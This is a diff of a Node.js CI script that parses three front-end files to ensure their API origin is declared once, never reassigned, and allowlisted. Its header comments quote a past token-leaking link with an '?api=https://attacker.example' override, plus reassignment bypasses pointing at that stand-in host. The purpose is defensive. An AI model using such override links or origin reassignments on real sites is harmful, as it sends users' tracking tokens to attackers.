@@ -1,102 +1,159 @@
 #!/usr/bin/env node
 /**
- * Guard: the site's API origin is one value, written once per file, and expected.
+ * Guard: the site's API origin is declared once, never rewritten, and expected.
  *
  * Why three copies exist
  * ----------------------
  * invite/invite.js, invite/redeem.js and track/track.js each declare their own
  * `API_BASE`. They are deliberately not collapsed into a shared
- * `window.SERAYAE_API_BASE`, but NOT for the security reason an earlier version
- * of this comment gave. That reason was wrong and review said so: any script
- * able to execute on /invite or /track already owns the page — it can replace
- * `window.fetch`, read the OTP field, or read the bearer token straight out of
- * the verify-otp response. Hiding the string in a closure buys nothing against
- * XSS.
+ * `window.SERAYAE_API_BASE` — but not for a security reason. An earlier version
+ * of this comment claimed a page global would be an exfiltration risk, and
+ * review was right to reject that: any script able to execute on /invite or
+ * /track already owns the page. It can replace `window.fetch`, read the OTP
+ * field, or read the bearer token out of the verify-otp response. Hiding a
+ * string in a closure buys nothing against XSS.
  *
- * The `?api=` override deleted in #7 was a different threat in kind: it was
- * attacker-controllable through a *link*, with no script execution at all. Send
+ * The `?api=` override deleted in #7 was a different threat in kind. It was
+ * attacker-controllable through a *link*, with no script execution at all: send
  * a guardian `/track/?t=<token>&api=https://attacker.example` and the tracking
- * token leaves in the request path. That is why an origin must never again be
- * writable from page input — and it is why this script's real job is rule 2
- * below, not the existence of three literals.
+ * token leaves in the request path. That is why the origin must never again be
+ * writable after its declaration — which is what rule 2 enforces, and the real
+ * reason this script exists.
  *
  * The literals stay for plain engineering reasons: a shared config.js adds a
- * script-order failure mode on pages where a broken base means a guardian
+ * script-order failure mode on pages where a missing base means a guardian
  * watching an emergency sees nothing, in exchange for deduplicating three
- * strings on a static site. Cheaper to check than to centralise.
+ * strings on a static site.
  *
- * What it enforces
- * ----------------
- *  1. Each file declares the origin exactly once, and that declaration is real
- *     code, not a commented-out line.
- *  2. The identifier is ASSIGNED exactly once in the whole file. This is the
- *     rule that matters: the #7 bug was `if (override) apiBase = override;` —
- *     a reassignment, not a declaration. A declaration-only check waved it
- *     through, which is what review demonstrated on the first version of this
- *     script.
- *  3. No `?api=`-style origin override is reintroduced.
- *  4. All origins are byte-identical across the three files.
+ * Why this uses a real parser
+ * ---------------------------
+ * Three earlier versions tried to do this with regular expressions over text,
+ * and independent review broke every one of them with a FAIL-OPEN bypass —
+ * meaning the check passed while the page actually fetched from an attacker
+ * host, proven by executing the file:
+ *
+ *   v1  matched only declarations, so a plain reassignment
+ *       `API_BASE = 'https://attacker.example/api'` passed.
+ *   v2  blanked whole lines that began with a comment, so
+ *       `/* note *\/ API_BASE = '<attacker>';` passed.
+ *   v3  used a hand-written scanner whose regex-vs-division heuristic read the
+ *       `/` in `x++ / 2` as opening a regex literal, ran it to the `//` of the
+ *       next `https://`, and blanked the live assignment in between. Its own
+ *       docstring claimed a wrong guess could only fail closed. That was false.
+ *
+ * Every one of those was a lexing bug, not a rule bug. Lexing JavaScript with
+ * regular expressions cannot be made sound, so this now parses the file and
+ * inspects the syntax tree. `acorn` is pinned in package.json and is the only
+ * dependency; it has none of its own.
+ *
+ * What it enforces, per file
+ * --------------------------
+ *  1. Exactly one `var API_BASE = <string literal>` declaration, and its
+ *     initialiser is a plain string — not a template, not a concatenation, not
+ *     a function call.
+ *  2. Zero further writes of any kind: assignment (`=`, `+=`, `||=`, `??=`, …),
+ *     destructuring (`({API_BASE} = cfg)`, `[[API_BASE]] = arr`, however
+ *     nested), `for (API_BASE of …)` / `for (API_BASE in …)`, and `++`/`--`.
+ *  3. No read of a URL parameter named `api`, and no `readApiOverride`.
+ *
+ * Across files
+ * ------------
+ *  4. All three origins are byte-identical.
  *  5. The host is on a positive allowlist. A blocklist of dead hosts cannot
  *     catch a mistyped redeploy of an unmemorable Heroku suffix.
- *  6. https, no port, path exactly `/api` (compared with no normalisation, so a
- *     trailing slash fails — `/api/` + `/referrals/redeem` yields `//` and 404s
- *     every request), no query, no fragment.
+ *  6. https, no port, path exactly `/api` (compared with no normalisation, so
+ *     `/api/` fails — it would build `//referrals/redeem` and 404 everything),
+ *     no query, no fragment.
  *
  * Usage
- *   node .github/scripts/check-api-origin.js             # verify
- *   node .github/scripts/check-api-origin.js --print     # print origin on the last line
- *
- * Exits non-zero with a specific message on any violation.
+ *   npm ci && node .github/scripts/check-api-origin.js
+ *   node .github/scripts/check-api-origin.js --print   # origin on stdout, alone
  */
 
 'use strict';
 
 const fs = require('fs');
 const path = require('path');
-const { scanSource } = require('./lib/scan');
+
+let acorn;
+try {
+  acorn = require('acorn');
+} catch {
+  console.error(
+    '✗ cannot load `acorn`.\n\n' +
+      '  This check parses JavaScript rather than pattern-matching it, because three\n' +
+      '  regex-based versions were each defeated by a fail-open lexing bug.\n\n' +
+      '  Run `npm ci` first.\n',
+  );
+  process.exit(2);
+}
 
 const REPO_ROOT = path.resolve(__dirname, '..', '..');
 
-/** Every file that holds an API origin, and the identifier holding it. */
-const TARGETS = [
-  { file: 'invite/invite.js', varName: 'API_BASE' },
-  { file: 'invite/redeem.js', varName: 'API_BASE' },
-  { file: 'track/track.js', varName: 'API_BASE' },
-];
+const VAR_NAME = 'API_BASE';
+
+const TARGETS = ['invite/invite.js', 'invite/redeem.js', 'track/track.js'];
 
 /**
  * The only hosts this site may talk to.
  *
- * Add `api.serayae.me` here in the SAME commit that repoints the three files to
- * it, so the two can never disagree. Do not add a staging host: use a local
- * build instead, which is the rule #7 established.
+ * Add `api.serayae.me` here in the SAME commit that repoints the three files.
+ * Do not add a staging host — use a local build, which is the rule #7 set.
  */
 const ALLOWED_HOSTS = [
   'serayae-api-01118af29270.herokuapp.com', // Heroku app `serayae-api`, EU region
   'api.serayae.me', // reserved for the custom-domain cutover
 ];
 
-/** Patterns that must not reappear anywhere in these files. */
-const FORBIDDEN_PATTERNS = [
-  {
-    // Any read of a URL parameter named `api`, however it is spelled. The v2
-    // pattern insisted on the literal `searchParams.get('api')` and review
-    // showed it matched nothing in this codebase's actual idiom.
-    pattern: /\bget(?:All)?\(\s*['"]api['"]\s*\)/,
-    reason:
-      'reading a URL parameter named `api` reintroduces the #7 override: a crafted ' +
-      'link could repoint the origin with no script execution at all.',
-  },
-  {
-    pattern: /\breadApiOverride\b/,
-    reason: 'this is the name of the function #7 deleted. It must not come back.',
-  },
-];
-
 const errors = [];
 const found = [];
 
-for (const { file, varName } of TARGETS) {
+/** Depth-first walk over every node in an ESTree tree. */
+function walk(node, visit) {
+  if (!node || typeof node !== 'object') return;
+  if (Array.isArray(node)) {
+    for (const child of node) walk(child, visit);
+    return;
+  }
+  if (typeof node.type === 'string') visit(node);
+  for (const key of Object.keys(node)) {
+    if (key === 'type' || key === 'start' || key === 'end' || key === 'loc' || key === 'range') {
+      continue;
+    }
+    walk(node[key], visit);
+  }
+}
+
+/** Does an assignment/binding target write to VAR_NAME, at any nesting depth? */
+function targetsVar(node) {
+  let hit = false;
+  walk(node, (n) => {
+    // A property KEY named API_BASE is not a write: `{ API_BASE: x }`.
+    // `walk` visits keys too, so check the identifier's role via its parents by
+    // excluding the shorthand-key case below instead of here.
+    if (n.type === 'Identifier' && n.name === VAR_NAME) hit = true;
+  });
+  return hit;
+}
+
+/**
+ * For an ObjectPattern, a non-shorthand property's KEY is not a binding.
+ * `({ API_BASE: other } = cfg)` writes `other`, not API_BASE.
+ * Strip those keys so they are not mistaken for writes.
+ */
+function bindingOnly(pattern) {
+  const clone = JSON.parse(JSON.stringify(pattern));
+  walk(clone, (n) => {
+    if (n.type === 'Property' && !n.shorthand && n.key) {
+      n.key = { type: 'Identifier', name: '__key__' };
+    }
+  });
+  return clone;
+}
+
+const line = (node) => (node.loc ? node.loc.start.line : '?');
+
+for (const file of TARGETS) {
   const abs = path.join(REPO_ROOT, file);
 
   if (!fs.existsSync(abs)) {
@@ -104,161 +161,169 @@ for (const { file, varName } of TARGETS) {
     continue;
   }
 
-  const raw = fs.readFileSync(abs, 'utf8');
+  const src = fs.readFileSync(abs, 'utf8');
 
-  // `code` has comment spans blanked but keeps string contents, so the declared
-  // origin is still readable and a `get('api')` override is still visible.
-  // `bare` additionally blanks the insides of strings, template literals and
-  // regex literals, so counting assignments in it cannot be fooled by the text
-  // `API_BASE =` appearing inside a string, a template or a trailing comment.
-  const { code, bare } = scanSource(raw);
-
-  // ── rule 1: exactly one real declaration ────────────────────────────────
-  const declRe = new RegExp(
-    `\\b(?:var|let|const)\\s+${varName}\\s*=\\s*(['"])([^'"]+)\\1\\s*;`,
-    'g',
-  );
-  const decls = [...code.matchAll(declRe)];
-
-  if (decls.length === 0) {
-    errors.push(
-      `${file}: no executable \`var ${varName} = '<origin>';\` declaration found. ` +
-        `A declaration that is commented out does not count — the page would throw ` +
-        `a ReferenceError under 'use strict'. If the variable was renamed, update ` +
-        `TARGETS in this script.`,
-    );
-    continue;
-  }
-  if (decls.length > 1) {
-    errors.push(
-      `${file}: ${decls.length} declarations of \`${varName}\`. Exactly one is required.`,
-    );
+  let ast;
+  try {
+    ast = acorn.parse(src, { ecmaVersion: 2022, sourceType: 'script', locations: true });
+  } catch (e) {
+    errors.push(`${file}: does not parse — ${e.message}`);
     continue;
   }
 
-  // ── rule 2: exactly one ASSIGNMENT anywhere (the #7 shape) ──────────────
-  //
-  // Matches plain `NAME =` AND every compound assignment (`+=`, `&&=`, `>>=`,
-  // `??=` …), while excluding the comparisons `==`, `===`, `!=`, `!==`, `>=`
-  // and `<=`.
-  //
-  // Two notes, both learned by testing rather than reasoning:
-  //
-  //   * An earlier version used a lookbehind after `\s*` to reject operators.
-  //     It was dead code: with `\s*` already consumed, the character before the
-  //     `=` is either whitespace or the last letter of the identifier, so the
-  //     lookbehind could never fire. Worse, it gave the false impression that
-  //     `+=` was handled — it was not, and `API_BASE += '/v2'` passed.
-  //   * Multi-character operators are listed before single ones as a matter of
-  //     style only. An earlier comment here claimed the longer forms would
-  //     otherwise never match; review disproved that by running three
-  //     orderings and getting identical results, because the engine backtracks
-  //     into the remaining alternatives. The claim was wrong and is corrected
-  //     rather than quietly deleted.
-  //
-  // Counted against `bare`, so the text `API_BASE =` inside a string, a
-  // template literal, a regex literal or a trailing comment is NOT counted.
-  // Each of those used to turn the build red on ordinary code.
-  //
-  // The leading `(?<![.\w$])` excludes property assignment: `window.API_BASE = x`
-  // and `obj.API_BASE = x` are not writes to the closure-local origin.
-  const ASSIGN_OPS = '\\*\\*|<<|>>>|>>|&&|\\|\\||\\?\\?|[+\\-*/%&|^]';
-  const assignRe = new RegExp(`(?<![.\\w$])${varName}\\s*(?:${ASSIGN_OPS})?=(?!=)`, 'g');
-  const assigns = [...bare.matchAll(assignRe)];
+  const declarations = [];
+  const writes = [];
+  const paramReads = [];
 
-  if (assigns.length !== 1) {
-    const lines = assigns.map((m) => bare.slice(0, m.index).split('\n').length);
-    errors.push(
-      `${file}: \`${varName}\` is assigned ${assigns.length} times (lines ${lines.join(', ')}), ` +
-        `expected exactly 1.\n    The #7 bug was a REASSIGNMENT — \`if (override) apiBase = override;\` — ` +
-        `not a second declaration. The origin must be written once and never again, or a ` +
-        `crafted link can repoint it and carry the token away.`,
-    );
-    continue;
-  }
-
-  // ── rule 2b: rebinding forms the assignment regex cannot see ───────────
-  //
-  // `({ API_BASE } = cfg)` and `for (API_BASE of [...])` both rewrite the origin
-  // without ever placing `API_BASE` immediately before an `=`. Review found both
-  // passing. Checked against `bare` so a mention inside a string cannot trip them.
-  const REBIND_FORMS = [
-    {
-      pattern: new RegExp(`[{\\[][^{}\\[\\]]*\\b${varName}\\b[^{}\\[\\]]*[}\\]]\\s*(?:${ASSIGN_OPS})?=(?!=)`),
-      reason:
-        `\`${varName}\` appears inside a destructuring assignment target. That rewrites ` +
-        `the origin without an obvious \`${varName} =\`, which is exactly how an override ` +
-        `would be hidden from a naive check.`,
-    },
-    {
-      pattern: new RegExp(`\\bfor\\s*\\([^)]*\\b${varName}\\b[^)]*\\b(?:of|in)\\b`),
-      reason:
-        `\`${varName}\` is rebound by a for-of/for-in header, which reassigns it on ` +
-        `every iteration.`,
-    },
-  ];
-  for (const { pattern, reason } of REBIND_FORMS) {
-    if (pattern.test(bare)) {
-      errors.push(`${file}: ${reason}`);
+  walk(ast, (node) => {
+    // ── rule 1: declarations ──────────────────────────────────────────────
+    if (node.type === 'VariableDeclarator' && node.id?.type === 'Identifier' && node.id.name === VAR_NAME) {
+      declarations.push(node);
+      return;
     }
-  }
 
-  // ── rule 3: no override mechanism anywhere in the file ──────────────────
-  // Run against `code`, not `bare`: the parameter name being read only exists
-  // inside a string literal, so blanking string contents would hide it.
-  for (const { pattern, reason } of FORBIDDEN_PATTERNS) {
-    if (pattern.test(code)) {
-      errors.push(`${file}: matches ${pattern} — ${reason}`);
+    // ── rule 2: every form of subsequent write ────────────────────────────
+    if (node.type === 'AssignmentExpression') {
+      if (node.left.type === 'Identifier' && node.left.name === VAR_NAME) {
+        writes.push({ node, how: `assignment (\`${node.operator}\`)` });
+      } else if (
+        (node.left.type === 'ObjectPattern' || node.left.type === 'ArrayPattern') &&
+        targetsVar(bindingOnly(node.left))
+      ) {
+        writes.push({ node, how: 'destructuring assignment' });
+      }
+      return;
     }
+
+    if (node.type === 'UpdateExpression' && node.argument?.type === 'Identifier' && node.argument.name === VAR_NAME) {
+      writes.push({ node, how: `update (\`${node.operator}\`)` });
+      return;
+    }
+
+    if (node.type === 'ForOfStatement' || node.type === 'ForInStatement') {
+      const left = node.left.type === 'VariableDeclaration' ? node.left.declarations : node.left;
+      if (targetsVar(bindingOnly(left))) {
+        writes.push({ node, how: `${node.type === 'ForOfStatement' ? 'for-of' : 'for-in'} rebinding` });
+      }
+      return;
+    }
+
+    // A second `var API_BASE` inside a nested function shadows rather than
+    // writes, but it is still confusing enough to reject; the declaration
+    // count in rule 1 covers it.
+
+    // ── rule 3: reading a URL parameter named `api` ───────────────────────
+    if (
+      node.type === 'CallExpression' &&
+      node.callee?.type === 'MemberExpression' &&
+      node.callee.property?.type === 'Identifier' &&
+      ['get', 'getAll'].includes(node.callee.property.name) &&
+      node.arguments.length > 0 &&
+      node.arguments[0].type === 'Literal' &&
+      node.arguments[0].value === 'api'
+    ) {
+      paramReads.push(node);
+      return;
+    }
+
+    if (node.type === 'Identifier' && node.name === 'readApiOverride') {
+      paramReads.push(node);
+    }
+  });
+
+  // ── report rule 1 ────────────────────────────────────────────────────────
+  if (declarations.length === 0) {
+    errors.push(
+      `${file}: no \`${VAR_NAME}\` declaration in the parsed syntax tree. A declaration ` +
+        `inside a comment does not count — the page would throw a ReferenceError under ` +
+        `'use strict'.`,
+    );
+    continue;
+  }
+  if (declarations.length > 1) {
+    errors.push(
+      `${file}: ${declarations.length} declarations of \`${VAR_NAME}\` ` +
+        `(lines ${declarations.map(line).join(', ')}). Exactly one is required — with two, ` +
+        `the value this check validates need not be the value the page uses.`,
+    );
+    continue;
   }
 
-  found.push({ file, varName, value: decls[0][2] });
+  const init = declarations[0].init;
+  if (!init || init.type !== 'Literal' || typeof init.value !== 'string') {
+    errors.push(
+      `${file}:${line(declarations[0])}: \`${VAR_NAME}\` must be initialised with a plain ` +
+        `string literal, got ${init ? init.type : 'no initialiser'}. A template, a ` +
+        `concatenation or a call would let the origin be computed at runtime, which is ` +
+        `exactly what must not be possible.`,
+    );
+    continue;
+  }
+
+  // ── report rule 2 ────────────────────────────────────────────────────────
+  if (writes.length > 0) {
+    errors.push(
+      `${file}: \`${VAR_NAME}\` is written again after its declaration:\n` +
+        writes.map((w) => `      line ${line(w.node)} — ${w.how}`).join('\n') +
+        `\n    The #7 bug was a reassignment: \`if (override) apiBase = override;\`. The ` +
+        `origin must be written once and never again, or a crafted link can repoint it ` +
+        `and carry a guardian's tracking token away.`,
+    );
+  }
+
+  // ── report rule 3 ────────────────────────────────────────────────────────
+  for (const node of paramReads) {
+    errors.push(
+      `${file}:${line(node)}: reads a URL parameter named \`api\`, or references ` +
+        `\`readApiOverride\`. That is the #7 override, which let a crafted link repoint ` +
+        `the origin with no script execution at all.`,
+    );
+  }
+
+  found.push({ file, value: init.value, declLine: line(declarations[0]) });
 }
 
 // ── rules 5 and 6: the value itself ────────────────────────────────────────
-for (const { file, value } of found) {
+for (const { file, value, declLine } of found) {
   let url;
   try {
     url = new URL(value);
   } catch {
-    errors.push(
-      `${file}: '${value}' is not a parsable absolute URL. The origin must be a ` +
-        `literal string, not a concatenation or template.`,
-    );
+    errors.push(`${file}:${declLine}: '${value}' is not a parsable absolute URL.`);
     continue;
   }
 
   if (url.protocol !== 'https:') {
     errors.push(
-      `${file}: scheme is '${url.protocol}' — must be https. These pages carry ` +
-        `bearer and tracking tokens.`,
+      `${file}:${declLine}: scheme is '${url.protocol}' — must be https. These pages ` +
+        `carry bearer and tracking tokens.`,
     );
   }
 
   if (!ALLOWED_HOSTS.includes(url.hostname)) {
     errors.push(
-      `${file}: host '${url.hostname}' is not allowed.\n    Permitted: ${ALLOWED_HOSTS.join(', ')}\n` +
-        `    An allowlist is used deliberately: the live host carries an unmemorable ` +
-        `random suffix, and a single mistyped character would otherwise pass every ` +
-        `other rule while breaking every invite and tracking link on the site.`,
+      `${file}:${declLine}: host '${url.hostname}' is not allowed.\n` +
+        `      Permitted: ${ALLOWED_HOSTS.join(', ')}\n` +
+        `    An allowlist is used deliberately: the live host carries an unmemorable random ` +
+        `suffix, and one mistyped character would otherwise pass every other rule while ` +
+        `breaking every invite and tracking link on the site.`,
     );
   }
 
   if (url.port !== '') {
-    errors.push(`${file}: origin must not specify a port (got ':${url.port}').`);
+    errors.push(`${file}:${declLine}: origin must not specify a port (got ':${url.port}').`);
   }
 
-  // Compared with NO normalisation on purpose: '/api/' would build
-  // '/api//referrals/redeem', which Express does not match.
+  // No normalisation on purpose: '/api/' would build '/api//referrals/redeem'.
   if (url.pathname !== '/api') {
     errors.push(
-      `${file}: path is '${url.pathname}' — must be exactly '/api' with no trailing ` +
-        `slash, because every call site appends a route like '/referrals/redeem'.`,
+      `${file}:${declLine}: path is '${url.pathname}' — must be exactly '/api' with no ` +
+        `trailing slash, because every call site appends a route like '/referrals/redeem'.`,
     );
   }
 
   if (url.search !== '' || url.hash !== '') {
-    errors.push(`${file}: origin must carry no query string or fragment (got '${value}').`);
+    errors.push(`${file}:${declLine}: origin must carry no query string or fragment.`);
   }
 }
 
@@ -269,9 +334,9 @@ if (found.length === TARGETS.length) {
     errors.push(
       'the origins disagree:\n' +
         found.map((f) => `      ${f.file.padEnd(18)} ${f.value}`).join('\n') +
-        '\n    All must be byte-identical. An invite is minted against one page and ' +
-        'redeemed on another; pointing them at different backends makes an invite ' +
-        'silently impossible to accept.',
+        '\n    All must be byte-identical. An invite is minted against one page and redeemed ' +
+        'on another; pointing them at different backends makes an invite silently impossible ' +
+        'to accept.',
     );
   }
 }
@@ -287,6 +352,5 @@ const origin = found[0].value;
 console.error(`✓ API origin check passed — all ${found.length} files agree on ${origin}`);
 
 if (process.argv.includes('--print')) {
-  // stdout carries ONLY the origin, so a caller can capture it without `tail`.
   process.stdout.write(`${origin}\n`);
 }
